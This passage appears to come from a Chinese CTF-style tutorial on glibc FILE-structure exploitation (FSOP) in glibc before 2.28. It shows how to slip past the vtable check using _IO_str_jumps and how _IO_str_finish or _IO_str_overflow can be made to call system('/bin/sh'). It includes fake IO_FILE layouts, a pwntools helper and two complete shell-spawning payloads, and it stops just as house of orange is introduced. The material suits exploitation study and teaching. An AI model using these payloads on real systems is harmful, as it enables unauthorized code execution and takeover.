
```c
void attribute_hidden _IO_vtable_check (void)
{
#ifdef SHARED
void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
#ifdef PTR_DEMANGLE
PTR_DEMANGLE (flag);
#endif
if (flag == &_IO_vtable_check) //检查是否是外部重构的vtable
return;
{
Dl_info di;
struct link_map *l;
if (_dl_open_hook != NULL
|| (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
&& l->l_ns != LM_ID_BASE)) //检查是否是动态链接库中的vtable
return;
}
...
__libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
}
```

因此，最好的办法是：我们伪造的`vtable`在`glibc`的`vtable`段中，从而得以绕过该检查。

目前来说，有四种思路：利用`_IO_str_jumps`中`_IO_str_overflow()`函数，利用`_IO_str_jumps`中`_IO_str_finish()`函数与利用`_IO_wstr_jumps`中对应的这两种函数，先来介绍最为方便的：利用`_IO_str_jumps`中`_IO_str_finish()`函数的手段。

`_IO_str_jumps`的结构体如下：

```c
const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
JUMP_INIT_DUMMY,
JUMP_INIT(finish, _IO_str_finish),
JUMP_INIT(overflow, _IO_str_overflow),
JUMP_INIT(underflow, _IO_str_underflow),
JUMP_INIT(uflow, _IO_default_uflow),
...
}
```

其中，`_IO_str_finish`源代码如下：

```c
void _IO_str_finish (_IO_FILE *fp, int dummy)
{
if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
((( _IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base); //执行函数
fp->_IO_buf_base = NULL;
_IO_default_finish (fp, 0);
}
```

其中相关的`_IO_str_fields`结构体与`_IO_strfile_`结构体的定义：

```c
struct _IO_str_fields
{
_IO_alloc_type _allocate_buffer;
_IO_free_type _free_buffer;
};
typedef struct _IO_strfile_
{
struct _IO_streambuf _sbf;
struct _IO_str_fields _s;
} _IO_strfile;
```

可以看到，它使用了`IO`结构体中的值当作函数地址来直接调用，如果满足条件，将直接将`fp->_s._free_buffer`当作函数指针来调用。

首先，仍然需要绕过之前的`_IO_flush_all_lokcp`函数中的输出缓冲区的检查`_mode<=0`以及`_IO_write_ptr>_IO_write_base`进入到`_IO_OVERFLOW`中。

我们可以将`vtable`的地址覆盖成`_IO_str_jumps-8`，这样会使得`_IO_str_finish`函数成为了伪造的`vtable`地址的`_IO_OVERFLOW`函数（因为`_IO_str_finish`偏移为`_IO_str_jumps`中`0x10`，而`_IO_OVERFLOW`为`0x18`）。这个`vtable`（地址为`_IO_str_jumps-8`）可以绕过检查，因为它在`vtable`的地址段中。

构造好`vtable`之后，需要做的就是构造`IO FILE`结构体其他字段，以进入将`fp->_s._free_buffer`当作函数指针的调用：先构造`fp->_IO_buf_base`为`/bin/sh`的地址，然后构造`fp->_flags`不包含`_IO_USER_BUF`，它的定义为`#define _IO_USER_BUF 1`，即`fp->_flags`最低位为`0`。

最后构造`fp->_s._free_buffer`为`system_addr`或`one gadget`即可`getshell`。

由于`libc`中没有`_IO_str_jump`的符号，因此可以通过`_IO_str_jumps`是`vtable`中的倒数第二个表，用`vtable`的最后地址减去`0x168`定位。

也可以用如下函数进行定位：

```python
# libc.address = libc_base
def get_IO_str_jumps():
IO_file_jumps_addr = libc.sym['_IO_file_jumps']
IO_str_underflow_addr = libc.sym['_IO_str_underflow']
for ref in libc.search(p64(IO_str_underflow_addr-libc.address)):
possible_IO_str_jumps_addr = ref - 0x20
if possible_IO_str_jumps_addr > IO_file_jumps_addr:
return possible_IO_str_jumps_addr
```

可以进行如下构造：

```c
._chain => chunk_addr
chunk_addr
{
file = {
_flags = 0x0,
_IO_read_ptr = 0x0,
_IO_read_end = 0x0,
_IO_read_base = 0x0,
_IO_write_base = 0x0,
_IO_write_ptr = 0x1,
_IO_write_end = 0x0,
_IO_buf_base = bin_sh_addr,
...
_mode = 0x0, //一般不用特意设置
_unused2 = '\000' <repeats 19 times>
},
vtable = _IO_str_jumps-8 //chunk_addr + 0xd8 ~ +0xe0
}
+0xe0 ~ +0xe8 : 0x0
+0xe8 ~ +0xf0 : system_addr / one_gadget //fp->_s._free_buffer
```

利用`house of orange`（见下文）构造的`payload`：

```python
payload = p64(0) + p64(0x60) + p64(0) + p64(libc.sym['_IO_list_all'] - 0x10) #unsorted bin attack
payload += p64(0) + p64(1) + p64(0) + p64(next(libc.search(b'/bin/sh')))
payload = payload.ljust(0xd8, b'\x00') + p64(get_IO_str_jumps() - 8)
payload += p64(0) + p64(libc.sym['system'])
```

再来介绍一下：利用`_IO_str_jumps`中`_IO_str_overflow()`函数的手段。

`_IO_str_overflow()`函数的源码如下：

```c
int _IO_str_overflow (_IO_FILE *fp, int c)
{
int flush_only = c == EOF;
_IO_size_t pos;
if (fp->_flags & _IO_NO_WRITES)
return flush_only ? 0 : EOF;
if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
{
fp->_flags |= _IO_CURRENTLY_PUTTING;
fp->_IO_write_ptr = fp->_IO_read_ptr;
fp->_IO_read_ptr = fp->_IO_read_end;
}
pos = fp->_IO_write_ptr - fp->_IO_write_base;
if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
{
if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
return EOF;
else
{
char *new_buf;
char *old_buf = fp->_IO_buf_base;
size_t old_blen = _IO_blen (fp);
_IO_size_t new_size = 2 * old_blen + 100;
if (new_size < old_blen)
return EOF;
new_buf
= (char *) (*(( _IO_strfile *) fp)->_s._allocate_buffer) (new_size); // 调用了fp->_s._allocate_buffer函数指针
if (new_buf == NULL)
{
/* __ferror(fp) = 1; */
return EOF;
}
if (old_buf)
{
memcpy (new_buf, old_buf, old_blen);
(*(( _IO_strfile *) fp)->_s._free_buffer) (old_buf);
/* Make sure _IO_setb won't try to delete _IO_buf_base. */
fp->_IO_buf_base = NULL;
}
memset (new_buf + old_blen, '\0', new_size - old_blen);
_IO_setb (fp, new_buf, new_buf + new_size, 1);
fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);
fp->_IO_write_base = new_buf;
fp->_IO_write_end = fp->_IO_buf_end;
}
}
if (!flush_only)
*fp->_IO_write_ptr++ = (unsigned char) c;
if (fp->_IO_write_ptr > fp->_IO_read_end)
fp->_IO_read_end = fp->_IO_write_ptr;
return c;
}
```

和之前利用`_IO_str_finish`的思路差不多，可以看到其中调用了`fp->_s._allocate_buffer`函数指针，其参数`rdi`为`new_size`，因此，我们将`_s._allocate_buffer`改为`system`的地址，`new_size`改为`/bin/sh`的地址，又`new_size = 2 * old_blen + 100`，也就是`new_size = 2 * _IO_blen (fp) + 100`，可以找到宏定义：`#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)`，因此`new_size = 2 * ((fp)->_IO_buf_end - (fp)->_IO_buf_base) + 100`，故我们可以使`_IO_buf_base = 0`，`_IO_buf_end = (bin_sh_addr - 100) // 2`，当然还不能忘了需要绕过`_IO_flush_all_lokcp`函数中的输出缓冲区的检查`_mode<=0`以及`_IO_write_ptr>_IO_write_base`才能进入到`_IO_OVERFLOW`中，故令`_IO_write_ptr = 0xffffffffffffffff`且`_IO_write_base = 0x0`即可。

最终可按如下布局`fake IO_FILE`：

```c
._chain => chunk_addr
chunk_addr
{
file = {
_flags = 0x0,
_IO_read_ptr = 0x0,
_IO_read_end = 0x0,
_IO_read_base = 0x0,
_IO_write_base = 0x0,
_IO_write_ptr = 0x1,
_IO_write_end = 0x0,
_IO_buf_base = 0x0,
_IO_buf_end = (bin_sh_addr - 100) // 2,
...
_mode = 0x0, //一般不用特意设置
_unused2 = '\000' <repeats 19 times>
},
vtable = _IO_str_jumps //chunk_addr + 0xd8 ~ +0xe0
}
+0xe0 ~ +0xe8 : system_addr / one_gadget //fp->_s._allocate_buffer
```

参考`payload`（劫持的`stdout`）：

```python
new_size = libc_base + next(libc.search(b'/bin/sh'))
payload = p64(0xfbad2084)
payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64(0xffffffffffffffff) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(0) # _IO_buf_base
payload += p64((new_size - 100) // 2) # _IO_buf_end
payload += p64(0) * 4
payload += p64(libc_base + libc.sym["_IO_2_1_stdin_"])
payload += p64(1) + p64((1<<64) - 1)
payload += p64(0) + p64(libc_base + 0x3ed8c0) #lock
payload += p64((1<<64) - 1) + p64(0)
payload += p64(libc_base + 0x3eb8c0)
payload += p64(0) * 6
payload += p64(libc_base + get_IO_str_jumps_offset()) # _IO_str_jumps
payload += p64(libc_base + libc.sym["system"])
```

而在`libc-2.28`及以后，由于不再使用偏移找`_s._allocate_buffer`和`_s._free_buffer`，而是直接用`malloc`和`free`代替，所以`FSOP`也失效了。

### house of orange

利用`unsorted bin attack` 配合 `IO_FILE attack (FSOP)`进行攻击。

通过`unsorted bin attack`将`_IO_list_all`内容从`_IO_2_1_stderr_`改为`main_arena+88/96`（实则指向`top chunk`）。
